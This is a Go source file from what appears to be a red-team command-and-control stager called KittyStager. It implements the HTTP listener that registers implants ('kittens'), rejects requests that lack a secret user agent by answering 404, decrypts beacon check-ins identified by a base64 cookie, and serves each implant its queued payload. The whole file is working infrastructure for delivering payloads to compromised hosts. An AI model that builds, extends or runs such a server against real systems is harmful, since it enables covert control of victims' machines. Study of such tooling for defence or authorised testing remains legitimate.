package http

import (
	"KittyStager/cmd/config"
	"KittyStager/cmd/crypto"
	"KittyStager/cmd/util"
	"crypto/rand"
	"crypto/rsa"
	b64 "encoding/base64"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"io"
	"net/http"
	"time"
)

var (
	userA    string
	defSleep int
)

var PrivS *rsa.PrivateKey

// CreateServer creates the HTTP server
func CreateHttpServer(conf config.General) {
	PrivS, _ = rsa.GenerateKey(rand.Reader, 512)
	Targets = make(map[string]*Kitten)
	defSleep = conf.GetSleep()
	address := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
	userA = conf.GetUserAgent()
	fmt.Printf("%s %s\n\n", color.Green("[+] Started http server on"), color.Yellow(address))
	http.HandleFunc(conf.GetEndpoint(), logRequest)
	http.HandleFunc(conf.GetReg1(), regHandler1)
	http.HandleFunc(conf.GetReg2(), regHandler2)
	http.HandleFunc(conf.GetAuth1(), authHandler1)
	http.HandleFunc(conf.GetAuth2(), authHandler2)
	err := http.ListenAndServe(address, nil)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// logRequest logs the requests from the kittens
func logRequest(w http.ResponseWriter, r *http.Request) {
	c := util.NewInitialChecks()
	userAgent := r.UserAgent()
	//check if the user agent is correct
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	cookie := r.Header.Get("Cookie")
	user, err := b64.StdEncoding.DecodeString(cookie)
	//check if the cookie is initial callback
	if r.Method == "POST" {
		data, _ := io.ReadAll(r.Body)
		uncypherData, _ := crypto.Decrypt(data, []byte(Targets[string(user)].GetKey()))
		if err != nil {
			util.ErrPrint(err)
			return
		}
		c, err = util.InitUnmarshalJSON(uncypherData)
		//If the beacon is not in the map, add it
		fmt.Printf("%s %s\n", color.Green("[+] Request from:"), color.Yellow(c.GetIp()))
		fmt.Printf("%s %s\n", color.Green("[+] Kitten name:"), color.Yellow(c.GetKittenName()))
		fmt.Printf("%s %s\n", color.Green("[+] User-Agent:"), color.Yellow(r.UserAgent()))

		Targets[string(user)].SetId(len(Targets))
		Targets[string(user)].SetLastSeen(time.Now())
		Targets[string(user)].SetSleep(defSleep)
		Targets[string(user)].SetAlive(true)
		Targets[string(user)].SetInitChecks(*c)

		_, err = w.Write(Targets[c.GetKittenName()].GetPayload())
		if err != nil {
			return
		}
		err = util.PrintInit(uncypherData)
		if err != nil {
			fmt.Println(color.Red("Error printing cookie"))
			return
		}
		// regular callback
	} else {
		kittenName := string(user)
		if _, ok := Targets[kittenName]; ok {
			_, err := w.Write(Targets[kittenName].GetPayload())
			Targets[kittenName].SetLastSeen(time.Now())
			if err != nil {
				return
			}
			Targets[kittenName].SetPayload(nil)
			return
		}

	}
}
